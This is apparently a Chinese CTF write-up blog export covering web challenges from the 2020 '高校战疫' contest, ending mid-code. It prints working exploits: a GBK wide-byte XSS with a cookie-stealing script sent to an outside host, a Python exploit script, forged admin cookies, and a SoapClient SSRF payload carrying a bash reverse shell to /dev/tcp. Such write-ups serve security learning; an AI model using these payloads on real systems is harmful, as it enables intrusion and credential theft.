<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312111745170.png" alt="image-20200312111745170"></p>
<p>然后跟进lib.php中的showMessage</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;body&gt;&lt;script&gt; var a = '&#123;$this-&gt;info-&gt;message&#125;';document.write(a);&lt;/script&gt;&lt;/body&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会把$this-&gt;info-&gt;message，输出出来，如果我们闭合这里的单引号，在后面加上js语句，就可以进行xss。然后继续看$this-&gt;info-&gt;message，这个值是</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112258374.png" alt="image-20200312112258374"></p>
<p>我们get输入的message变量，然后调用leavemessage对输入进行检测后赋给$this-&gt;info-&gt;message。</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112213426.png" alt="image-20200312112213426"></p>
<p>可以看到这里对message进行了addslashes处理，所以我们如果想闭合之前的单引号，就可以通过像sql注入中宽字节注入的方法，</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112846438.png" alt="image-20200312112846438" style="zoom:200%;">

<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html" target="_blank" rel="noopener">图片</a></p>
<p>然后就需要找到可以设置响应编码的地方，同时这道题还有一个eval的利用点，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113714354.png" alt="image-20200312113714354"></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113641620.png" alt="image-20200312113641620"></p>
<p>会把我们输入的answer拼接到命令执行中，而且前面还用了clone浅复制</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113840370.png" alt="image-20200312113840370"></p>
<p>所以我们可以在这里修改user的属性，然后分析lib.php中的go函数</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114156603.png" alt="image-20200312114156603"></p>
<p>如果this-&gt;location不等于this-&gt;page，那么就会调用go()函数，go函数中会把pre after location 进行拼接，然后传给header,如果可以控制这三个变量，就可以在这里设置gb18130编码，达到宽字节注入。然后可以在本地测试，把源码中的//var_dump($user)；注释删掉，可以更清晰的看出，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114803092.png" alt="image-20200312114803092"></p>
<p>在 quiz.php中52，53行</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312115014677.png" alt="image-20200312115014677"></p>
<p>url-&gt;page为index,如果这里传入的referer不等于index的话，就会把$referer赋给user-&gt;url-&gt;referer，然后在45，46行，如果$user-&gt;url-&gt;referer != $user-&gt;url-&gt;page，将user-&gt;url-&gt;referer赋给user-&gt;url-&gt;location，所以这里通过发送两次请求，就可以控制$user-&gt;url-&gt;location的值，然后就可以调用header函数，paylaod如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quiz.php?referer&#x3D;Content-Type: text&#x2F;html; charset&#x3D;GBK; kkkk: &amp;answer&#x3D;user-%3Eurl-%3Epre</span><br></pre></td></tr></table></figure>

<p>然后这里我们可以进行xss，但是在lib.php开头</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"style-src 'self'; script-src 'unsafe-inline' http://&lt;?=$_SERVER['HTTP_HOST']?&gt;/; object-src 'none'; frame-src 'self'"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>设置了csp，就不能在message直接传入我们vps或xss平台的链接了，然后这道题目还有一个文件上传的点，我们可以上传一个文件内容为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">window</span>.location = <span class="string">"http://ip:8888/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(a,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">location.href=<span class="string">"//xxxxxxx?c="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie）</span><br></pre></td></tr></table></figure>

<p>的文件，后缀可以设为txt,然后在index.php中传入message值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?message&#x3D;%df%27;jscode;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"e3sugtvfki7aketdnkofbt9odu"</span>&#125;</span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http:127.0.0.1:8080"</span>&#125;</span><br><span class="line">theurl=<span class="string">"http://192.168.35.158/gxzy-happyvacation/"</span></span><br><span class="line">thejs=<span class="string">"http://192.168.35.158/upload/56b6f09c50bfb4706563cdf3463a6cc3.txt"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(sth)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sth:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">xss = p(<span class="string">"&lt;script src='$$$'&gt;&lt;/script&gt;"</span>.replace(<span class="string">"$$$"</span>,thejs))</span><br><span class="line">r=requests.get(theurl+<span class="string">"index.php"</span> + <span class="string">"?message=%df%27;document.write(String.fromCharCode($$$));//"</span>.replace(<span class="string">"$$$"</span>,xss),cookies=cookie,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>

<p>然后再看ask.php</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120608437.png" alt="image-20200312120608437"></p>
<p>这里会重定向到check.php,题目并没有给check.php内容，但是前面我们都已经连上马了，就可以看到check.php的具体内容</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120802997.png" alt="image-20200312120802997"></p>
<p>然后看看bot.py</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120855917.png" alt="image-20200312120855917"></p>
<p>bot会到这flag和我们的session_id去访问teacher.php,</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312121003825.png" alt="image-20200312121003825"></p>
<p>teacher.php就是调用了showMessage()，echo出 sesion_id对应的$this-&gt;info-&gt;message。本地复现的时候bot.py老是报错，然后就没有试，可以手工带上session_id访问teacher.php</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312131931542.png" alt="image-20200312131931542"></p>
<p>确实可以nc到。</p>
<h1 id="0x04-not-hardweb"><a href="#0x04-not-hardweb" class="headerlink" title="0x04 not hardweb"></a>0x04 not hardweb</h1><p>非预期复现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">    $IV = <span class="string">"********"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">            $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = <span class="string">"guest"</span>;</span><br><span class="line">        $o = <span class="keyword">new</span> User($username);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果直接把cookie中的PHPSESSID删掉，那么SESSION[‘key’]和SESSION[‘iv’]就为空，然后直接将我们通过key和iv为空伪造的cookie，传给服务器，直接就会变成admin.</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $user  = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line"> $user= serialize($user);</span><br><span class="line"></span><br><span class="line"> $user1= base64_encode(openssl_encrypt($user, <span class="string">'des-cbc'</span>, <span class="string">''</span>, <span class="number">0</span>, <span class="string">''</span>));</span><br><span class="line"> <span class="keyword">echo</span> $user1.<span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> md5($user);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user:b3hIekw5Mk82WTQwbUk1M3RHYThQR0V4UmVZeHVSdE1ranZRYk43eksyVXhaTnFQZ2l1YkRKc0dpd1Z5cUlzVg&#x3D;&#x3D;</span><br><span class="line">hash:abc2f600e79557ef90ca4e07516b486f</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135230044.png" alt="image-20200312135230044"></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135406279.png" alt="image-20200312135406279"></p>
<p>然后这道题之后就是用SoapClient 打内网了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$location &#x3D; &#39;http:&#x2F;&#x2F;10.10.1.12&#x2F;index.php?cc&#x3D;%60%24cc%60%3Bbash%20-c%20%27bash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2Fip%2F8081%200&gt;%261%27%3B&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $location ,&#39;uri&#39;  &#x3D;&gt; &#39;123&#39;));</span><br><span class="line">$user &#x3D; serialize($a);</span><br><span class="line">$user1&#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;));</span><br><span class="line">echo $user1.&quot;\n&quot;;</span><br><span class="line">echo md5($user);</span><br></pre></td></tr></table></figure>

<p>然后再按之前的方法就可以反弹shell了。后面的没环境就不做了。</p>
<p>参考链接</p>
<p><a href="https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt</a></p>
<p><a href="http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer" target="_blank" rel="noopener">http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer</a></p>
<p><a href="https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA</a></p>
<p><a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
<p><a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>高校战“疫”网络安全分享赛web部分题解</title>
    <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>web题目很好，就是多的看都看不过来，别说做了 ，全程靠着师傅带，继续划水，记录下做题和复现</p>
<a id="more"></a>

<h1 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h1><p>扫描可以得到<a href="http://www.zip源码，题目打开的界面是这样" target="_blank" rel="noopener">www.zip源码，题目打开的界面是这样</a></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309092409185.png" alt="image-20200309092409185">有两个功能，一个连接远程mysql数据库，一个图片上传，接下来审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//testsql.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$ip = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$option = $_POST[<span class="string">'option'</span>];</span><br><span class="line">$m = <span class="keyword">new</span> db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure>

<p>会把我们POST输入的ip、user、password、option传给db类去实例化$m。看下db类的代码</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093110063.png" alt="image-20200309093110063"></p>
<p>然后看文件上传的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//filestore.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_FILES["file"]);</span></span><br><span class="line">$file = <span class="keyword">new</span> File($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">$fileupload = <span class="keyword">new</span> Fileupload($file);</span><br><span class="line">$fileupload-&gt;deal();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"存储的图片:"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$ls = <span class="keyword">new</span> Listfile(<span class="string">'./uploads/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">echo</span> $ls-&gt;listdir().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>会把我们上传的文件传给File类去实例化，然后将$file变量传给Fileupload类去实例化，调用$fileupload的deal方法，然后又实例化Listfile，调用$ls的listdir方法，看下源码</p>
<ul>
<li>File类</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093951334.png" alt="image-20200309093951334"></p>
<p>功能很简单</p>
<ul>
<li>Fileupload类</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093716970.png" alt="image-20200309093716970"></p>
<p>白名单机制，应该是不能传马。</p>
<ul>
<li>Listfile类</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093901396.png" alt="image-20200309093901396"></p>
<p>神奇的__call()魔法函数，竟然可以执行命令，那就是反序列化实锤了，全局搜索都找不到serialise()函数，怎么触发反序列化呢，之前还有一个连接mysql的功能，想起之前的那篇CSS-T | Mysql Client 任意文件读取攻击链拓展的<a href="https://paper.seebug.org/1112/" target="_blank" rel="noopener">文章</a>。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309100302528.png" alt="image-20200309100302528"></p>
<p>刚好和之前的图片上传结合，在vps上搭一个Rogue-mysql-server,（怎么用就不介绍了，上文写的很清楚）去读上传的phar文件，触发反序列化，欧克。</p>
<p>我们可以通过之前post传的option变量来启用LOAD LOCAL INFILE</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309101105263.png" alt="image-20200309101105263">然后开始输入<strong><code>MYSQLI_OPT_LOCAL_INFILE</code></strong></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309103020545.png" alt="image-20200309103020545"></p>
<p>但是没有回显，但是服务器端没有读到文件，然后在本地进行测试，我们直接把option变成<code>MYSQLI_OPT_LOCAL_INFILE</code>发现在服务器端是可以读到文件的，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309104511384.png" alt="image-20200309104511384"></p>
<p>这样设置了之后是可以读到文件的，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110611932.png" alt="image-20200309110611932"></p>
<p>但是如果我们这样</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110803039.png" alt="image-20200309110803039"></p>
<p>是不能读到文件的</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110936451.png" alt="image-20200309110936451"></p>
<p>后来去查php的手册看到</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111041201.png" alt="image-20200309111041201"></p>
<p>option是int型的，然后就去查了php的常量表，MYSQLI_OPT_LOCAL_INFILE是8。</p>
<p>然后把option改成8试试</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111228502.png" alt="image-20200309111228502"></p>
<p>可以读到文件</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111401976.png" alt="image-20200309111401976"></p>
<p>然后去生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: admin</span></span><br><span class="line"><span class="comment"> * Date: 2020/3/8</span></span><br><span class="line"><span class="comment"> * Time: 10:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 